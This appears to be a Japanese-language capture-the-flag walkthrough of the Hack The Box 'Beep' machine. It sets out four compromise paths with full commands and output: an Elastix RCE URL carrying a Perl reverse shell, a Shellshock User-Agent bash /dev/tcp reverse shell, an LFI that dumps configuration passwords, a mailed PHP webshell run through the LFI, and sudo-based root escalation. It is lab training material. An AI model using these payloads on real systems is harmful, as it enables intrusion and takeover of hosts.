https://app.hackthebox.com/machines/Beep

## STEP 1
```sh
└─$ rustscan -a 10.129.205.98 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.205.98:22
Open 10.129.205.98:25
Open 10.129.205.98:80
Open 10.129.205.98:110
Open 10.129.205.98:111
Open 10.129.205.98:143
Open 10.129.205.98:443
Open 10.129.205.98:857
Open 10.129.205.98:993
Open 10.129.205.98:995
Open 10.129.205.98:3306
Open 10.129.205.98:4190
Open 10.129.205.98:4445
Open 10.129.205.98:4559
Open 10.129.205.98:5038
Open 10.129.205.98:10000
10.129.205.98 -> [22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000]
```
```sh
└─$ nmap -n -Pn -p 22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000 -sV 10.129.205.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 07:40 EDT
Nmap scan report for 10.129.205.98
Host is up (0.52s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
857/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.41 seconds
```


## PATH 1
8B番にアクセスすると、443番にリダイレクトされた  
がsslエラーが発生した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_01.png">  
どうやらtlsv1.0が有効らしい
```sh
└─$ sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 10.129.205.98
Version: 2.1.5
OpenSSL 3.5.0 8 Apr 2025

Connected to 10.129.205.98

Testing SSL server 10.129.205.98 on port 443 using SNI name 10.129.205.98

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   disabled
TLSv1.2   disabled
TLSv1.3   disabled
```
firefoxの設定を修正  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_02.png">  
無事確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_03.png">  
elastixには、CVE-2012-4869の脆弱性があり、rceできるらしい
```sh
└─$ searchsploit -m 18650
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
Copied to: /home/kali/18650.py
```
PoCは実行エラーしたが、コードを確認するとurlのワンライナーでRCEできるっぽい  
修正する部分は、rhost、lhost、lport、extension  
extensionは、sipのextensinのこと、elastixはVoIP系のソフトウェアなのね
```
https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
sipのinviteで認証を求められるextensionを発見した（ノイズが多かったので233のみ指定して実行してるよ）
```sh
└─$ svwar -m INVITE 10.129.205.98 -e 233
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
PoCのrce実行
```html
└─$ curl --insecure --tlsv1.0 'https://10.129.205.98/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.11%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <TITLE>Voicemail Message Call Me Control</TITLE>
    <link rel="stylesheet" href="../theme/main.css" type="text/css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>

<table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'><tr><td valign='middle' style='border: 0px'><a href='callme_page.php?action=h&callmenum=233@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.11:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

'>Click here to hang up.</a></td></tr></table><script language='javascript'>parent.document.getElementById('callme_status').innerHTML = 'The call has been answered.';</script><script language='javascript'>parent.document.getElementById('pb_load_inprogress').value='false';</script><script language='javascript'>parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';</script>  </body>
</html>
```
リーバスシェル取得、ユーザフラグゲット！
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 59677

python -c 'import pty; pty.spawn("/bin/bash")'

bash-3.2$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               export SHELL=bash

bash-3.2$ export TERM=xterm-256color

bash-3.2$ stty rows 66 columns 236

bash-3.2$ id
uid=100(asterisk) gid=101(asterisk)

bash-3.2$ cat /home/fanis/user.txt
2d69147c6496412b22133b3a0bd01a6e
```
sudoでnmapをroot権限で実行できるので、ルートフラグゲット！
```sh
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig

bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash

bash-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

bash-3.2# cat /root/root.txt
458340087499999a4af363208718ed2c
```


## PATH 2
elastixには、LFIの脆弱性もあるらしい
```sh
└─$ searchsploit -m 37637 
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/kali/37637.pl
```
PoCを確認すると、LFIできるurlを確認
```sh
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
LFI成功！コンフィグ抽出できた
```sh
└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# FOPSORT=extension|lastname
# DEFAULT VALUE: extension
# FOP should sort extensions by Last Name [lastname] or by Extension [extension]

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

# AUTHTYPE=database|none
# Authentication type to use for web admininstration. If type set to 'database', the primary
# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
AUTHTYPE=database

# AMPADMINLOGO=filename
# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
# you to customize the look of the administration screen.
# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
# This image should be 55px in height
AMPADMINLOGO=logo.png

# USECATEGORIES=true|false
# DEFAULT VALUE: true
# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
# alphabetically with no categories shown (false).

# AMPEXTENSIONS=extensions|deviceanduser
# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
# administered together as a unified Extension, and appear on a single page.
# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
# independent of each other, allowing association of one User to many Devices, or allowing 
# Users to login and logout of Devices.
AMPEXTENSIONS=extensions

# ENABLECW=true|false
ENABLECW=no
# DEFAULT VALUE: true
# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
# phones to be commissioned with call waiting already enabled. The user would then be required
# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
# this alone. It allows multi-line phones to receive multiple calls on their line appearances.

# CWINUSEBUSY=true|false
# DEFAULT VALUE: true
# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.

# AMPBADNUMBER=true|false
# DEFAULT VALUE: true
# Generate the bad-number context which traps any bogus number or feature code and plays a
# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
# will want to set this to false.

# AMPBACKUPSUDO=true|false
# DEFAULT VALUE: false
# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
# on the system:
#       asterisk localhost=(root)NOPASSWD: /bin/tar
#       Defaults:asterisk !requiretty
# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE

# CUSTOMASERROR=true|false
# DEFAULT VALUE: true
# If false, then the Destination Registry will not report unknown destinations as errors. This should be
# left to the default true and custom destinations should be moved into the new custom apps registry.

# DYNAMICHINTS=true|false
# DEFAULT VALUE: false
# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
# with "execincludes=yes" set in the [options] section.

# XTNCONFLICTABORT=true|false
# BADDESTABORT=true|false
# DEFAULT VALUE: false
# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
# conflict is detected or a destination is detected. It is usually better to allow the reload to go
# through and then correct the problem but these can be set if a more strict behavior is desired.

# SERVERINTITLE=true|false
# DEFAULT VALUE: false
# Precede browser title with the server name.

# USEDEVSTATE = true|false
# DEFAULT VALUE: false
# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
# BLF for server side feature codes such as daynight, followme, etc.

# MODULEADMINWGET=true|false
# DEFAULT VALUE: false
# Module Admin normally tries to get its online information through direct file open type calls to URLs that
# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
# This will often solve the problem. However, in such environment there can be a significant timeout before
# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.

# AMPDISABLELOG=true|false
# DEFAULT VALUE: true
# Whether or not to invoke the FreePBX log facility

# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
# DEFAULT VALUE: LOG_ERR
# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
# determine where to log

# AMPENABLEDEVELDEBUG=true|false
# DEFAULT VALUE: false
# Whether or not to include log messages marked as 'devel-debug' in the log system

# AMPMPG123=true|false 
# DEFAULT VALUE: true
# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
# phone system.

# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
# CDRDBPORT: Port number for db host 
# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
# CDRDBNAME: name of database used for cdr records
# CDRDBTYPE: mysql or postgres mysql is default
# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 

# AMPVMUMASK=mask 
# DEFAULT VALUE: 077 
# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.

# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 6
# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 20
# These can be used to change the refresh rate of the System Status Panel. Most of
# the stats are updated based on the STATS interval but a few items are checked
# less frequently (such as Asterisk Uptime) based on the INFO value

# ZAP2DAHDICOMPAT=true|false
ZAP2DAHDICOMPAT=true
# DEFAULT VALUE: false
# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
# automatically use all your ZAP configuration settings (devices and trunks) and
# silently convert them, under the covers, to DAHDI so no changes are needed. The
# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
# This will also keep Zap Channel DIDs working.

# CHECKREFERER=true|false
# DEFAULT VALUE: true
# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
# settings will be validated to assure the request is coming from the server. This will protect the system
# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
# URLs that could modify settings which can be allowed by changing this field to false.

# USEQUEUESTATE=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
# https://issues.asterisk.org/view.php?id=15168
# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
# the release version is known, code will be added to automatically enable this format in versions of Asterisk
# that support it.

# USEGOOGLEDNSFORENUM=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy

# MOHDIR=subdirectory_name
# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
# if not specified it will default to mohmp3 for backward compatibility.
MOHDIR=mohmp3
# RELOADCONFIRM=true|false
# DEFAULT VALUE: true
# When set to false, will bypass the confirm on Reload Box

# FCBEEPONLY=true|false
# DEFAULT VALUE: false
# When set to true, a beep is played instead of confirmation message when activating/de-activating:
# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow

# DISABLECUSTOMCONTEXTS=true|false
# DEFAULT VALUE: false
# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
# Asterisk log if there is no context found to include though it results in no errors. If you know that you
# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
# and include the contexts.

# AMPMODULEXML lets you change the module repository that you use. By default, it
# should be set to http://mirror.freepbx.org/ - Presently, there are no third
# party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

# AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
# This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```
LFIで取得したパスワード`jEhdIekWmdjE`でrootのsshログイン成功！
```sh
└─$ ssh root@10.129.205.98
Unable to negotiate with 10.129.205.98 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

└─$ ssh -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 root@10.129.205.98
Unable to negotiate with 10.129.205.98 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

└─$ ssh -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@10.129.205.98
The authenticity of host '10.129.205.98 (10.129.205.98)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.98' (RSA) to the list of known hosts.
root@10.129.205.98's password: 

Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.205.98

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```


## PATH 3
10000番ポートにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Beep_04.png">  
webページのソースを確認すると、このページは`/session_login.cgi`で動いているっぽい
```html
└─$ curl --insecure --tlsv1.0 https://10.129.205.98:10000/
<!doctype html public "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<link rel='stylesheet' type='text/css' href='/unauthenticated/style.css' />
<script type='text/javascript' src='/unauthenticated/toggleview.js'></script>
<script>
var rowsel = new Array();
</script>
<script type='text/javascript' src='/unauthenticated/sorttable.js'></script>
<meta http-equiv="Content-Type" content="text/html; Charset=iso-8859-1">
<title></title>
<title>Login to Webmin</title></head>
<body bgcolor=#ffffff link=#0000ee vlink=#0000ee text=#000000    onLoad='document.forms[0].pass.value = ""; document.forms[0].user.focus()'>
<table class='header' width=100%><tr>
<td id='headln2l' width=15% valign=top align=left></td>
<td id='headln2c' align=center width=70%><font size=+2></font></td>
<td id='headln2r' width=15% valign=top align=right></td></tr></table>
<p><center>

<form class='ui_form' action='/session_login.cgi' method=post >
<input class='ui_hidden' type=hidden name="page" value="/">
<table class='shrinkwrapper' width=40% class='loginform'>
<tr><td>
<table class='ui_table' width=40% class='loginform'>
<thead><tr class='ui_table_head'><td><b>Login to Webmin</b></td></tr></thead>
<tbody> <tr class='ui_table_body'> <td colspan=1><table width=100%>
<tr class='ui_table_row'>
<td valign=top colspan=2 align=center class='ui_value'>You must enter a username and password to login to the Webmin server on <tt>10.129.205.98</tt>.</td>
</tr>
<tr class='ui_table_row'>
<td valign=top  class='ui_label'><b>Username</b></td>
<td valign=top colspan=1  class='ui_value'><input class='ui_textbox' name="user" value="" size=20  ></td>
</tr>
<tr class='ui_table_row'>
<td valign=top  class='ui_label'><b>Password</b></td>
<td valign=top colspan=1  class='ui_value'><input class='ui_password' type=password name="pass" value="" size=20  ></td>
</tr>
<tr class='ui_table_row'>
<td valign=top  class='ui_label'><b> </b></td>
<td valign=top colspan=1  class='ui_value'><input class='ui_checkbox' type=checkbox name="save" value="1"  id="save_1" > <label for="save_1">Remember login permanently?</label>
</td>
</tr>
</tbody></table></td></tr></table>
</td></tr>
</table>

<input class='ui_submit' type=submit value="Login">
<input type=reset value="Clear">
</form>
</center>

<script>
if (window != window.top) {
        window.top.location = window.location;
        }
</script>
</div><p>
<br>
</body></html>
curl: (56) OpenSSL SSL_read: SSL_ERROR_SYSCALL, errno 0
```
cgiなので、shellshockがあるか調査
```sh
└─$ curl --insecure --tlsv1.0 -A "() { :;};ping -c 1 10.10.16.11" https://10.129.205.98:10000
```
pingが返ってきたので、shellshockを確認！
```sh
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:22:00.190545 IP 10.129.205.98 > 10.10.16.11: ICMP echo request, id 45120, seq 1, length 64
20:22:00.190575 IP 10.10.16.11 > 10.129.205.98: ICMP echo reply, id 45120, seq 1, length 64
```
ということで、shellshock経由でrce実行
```sh
└─$ curl --insecure --tlsv1.0 -A "() { :;};bash -i >& /dev/tcp/10.10.16.11/4444 0>&1" https://10.129.205.98:10000
<!doctype html public "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<link rel='stylesheet' type='text/css' href='/unauthenticated/style.css' />
<script type='text/javascript' src='/unauthenticated/toggleview.js'></script>
<script>
var rowsel = new Array();
</script>
<script type='text/javascript' src='/unauthenticated/sorttable.js'></script>
<meta http-equiv="Content-Type" content="text/html; Charset=iso-8859-1">
^C
```
リバースシェル取得！ルートゲット
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 52292
bash: no job control in this shell
[root@beep webmin]# id
uid=0(root) gid=0(root)
```


## PATH 4
path2で、LFIを確認した  
smtpでメール本文内にphpのwebshellを埋め込み・送付
```sh
└─$ swaks --to asterisk@localhost --from kali@localhost --header "Subject: test shell" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.129.205.98
=== Trying 10.129.205.98:25...
=== Connected to 10.129.205.98.
<-  220 beep.localdomain ESMTP Postfix
 -> EHLO kali
<-  250-beep.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<kali@localhost>
<-  250 2.1.0 Ok
 -> RCPT TO:<asterisk@localhost>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Fri, 27 Jun 2025 21:48:31 -0400
 -> To: asterisk@localhost
 -> From: kali@localhost
 -> Subject: test shell
 -> Message-Id: <20250627214831.570096@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> check out this code: <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as E5F79C0003
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```
LFIでwebshellを実行できることが分かった
```sh
└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=id" | grep 'From kali@localhost' -A 30
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 18434    0 18434    0     0  11360      0 --:--:--  0:00:01 --:--:-- 11357
From kali@localhost.localdomain  Sat Jun 28 04:48:53 2025
Return-Path: <kali@localhost.localdomain>
X-Original-To: asterisk@localhost
Delivered-To: asterisk@localhost.localdomain
Received: from kali (unknown [10.10.16.11])
        by beep.localdomain (Postfix) with ESMTP id E5F79C0003
        for <asterisk@localhost>; Sat, 28 Jun 2025 04:48:52 +0300 (EEST)
Date: Fri, 27 Jun 2025 21:48:31 -0400
To: asterisk@localhost
From: kali@localhost
Subject: test shell
Message-Id: <20250627214831.570096@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

check out this code: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)



Sorry! Attempt to access restricted file.
```
リバースシェル用のコマンド実行
```sh
└─$ urlencode "bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"  
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261

└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261"
```
リバースシェル取得！
sudoでchmodを操作できるので、rootがユーザであるbashにSUIDを付与し、権限昇格成功！
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 49601
bash: no job control in this shell
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)

bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
